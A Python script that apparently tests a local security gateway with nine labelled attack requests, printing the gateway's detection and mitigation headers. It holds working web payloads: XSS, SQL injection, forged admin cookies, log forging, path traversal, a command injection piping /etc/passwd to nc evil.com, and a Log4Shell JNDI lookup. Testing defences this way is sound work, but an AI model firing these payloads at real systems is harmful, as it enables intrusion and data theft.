import requests
import json

LAB_TEST_CASES = [
    {
        'id': 'NORMAL_001',
        'method': 'GET',
        'url': 'http://localhost:8080/api/books',
        'headers': {'X-Authenticated-User': 'user01'},
        'body': None
    },
    {
        'id': 'BOLA_001',
        'method': 'PUT',
        'url': 'http://localhost:8080/api/books/201',
        'headers': {'X-Authenticated-User': 'user01'},
        'body': {'title': 'Unauthorized Modification'}
    },
    {
        'id': 'XSS_001',
        'method': 'POST',
        'url': 'http://localhost:8080/api/comments/book/101',
        'headers': {'X-Authenticated-User': 'user01', 'Authorization': 'Bearer dummy-token-user01'},
        'body': {'text': '<script>alert("xss")</script><img src=x onerror=alert(1)>'}
    },
    {
        'id': 'SQLI_001',
        'method': 'GET',
        'url': 'http://localhost:8080/api/books?search=%27%20OR%20%271%27=%271%20--%20UNION%20SELECT%20*',
        'headers': {'X-Authenticated-User': 'user01'},
        'body': None
    },
    {
        'id': 'COOKIE_001',
        'method': 'GET',
        'url': 'http://localhost:8080/api/books',
        'headers': {'Cookie': 'admin=true; role=superadmin; token=malicious_forge_xyz', 'X-Authenticated-User': 'user01'},
        'body': None
    },
    {
        'id': 'LOGFORGE_001',
        'method': 'POST',
        'url': 'http://localhost:8080/api/comments/book/101',
        'headers': {'X-Authenticated-User': 'user01', 'Authorization': 'Bearer dummy-token-user01'},
        'body': {'text': "Normal text\r\n[2026-10-08 17:00:00] [CRITICAL] Admin granted root privileges"}
    },
    {
        'id': 'RCE_001',
        'method': 'GET',
        'url': 'http://localhost:8080/api/books?search=;%20cat%20/etc/passwd%20|%20nc%20evil.com%204444',
        'headers': {'X-Authenticated-User': 'user01'},
        'body': None
    },
    {
        'id': 'TRAVERSAL_001',
        'method': 'GET',
        'url': 'http://localhost:8080/api/books/..%2F..%2F..%2Fetc%2Fpasswd',
        'headers': {'X-Authenticated-User': 'user01'},
        'body': None
    },
    {
        'id': 'LOG4J_001',
        'method': 'POST',
        'url': 'http://localhost:8080/api/comments/book/101',
        'headers': {'X-Authenticated-User': 'user01', 'Authorization': 'Bearer dummy-token-user01'},
        'body': {'text': '${jndi:ldap://evil-host.com:1389/Exploit}'}
    }
]

print("Testing all 9 Security Lab cases against live Gateway:")
for tc in LAB_TEST_CASES:
    headers = tc['headers'].copy()
    headers['X-Test-Case-Id'] = tc['id']
    headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    
    if tc['method'] == 'GET':
        r = requests.get(tc['url'], headers=headers)
    elif tc['method'] == 'POST':
        r = requests.post(tc['url'], headers=headers, json=tc['body'])
    elif tc['method'] == 'PUT':
        r = requests.put(tc['url'], headers=headers, json=tc['body'])
        
    sec_dec = r.headers.get('X-Security-Decision', 'None')
    sec_fam = r.headers.get('X-Attack-Family', 'None')
    mit = r.headers.get('X-Mitigation-Action', 'None')
    print(f"{tc['id']:15} Status: {r.status_code:3} Dec: {sec_dec:5} Fam: {sec_fam:10} Mit: {mit}")
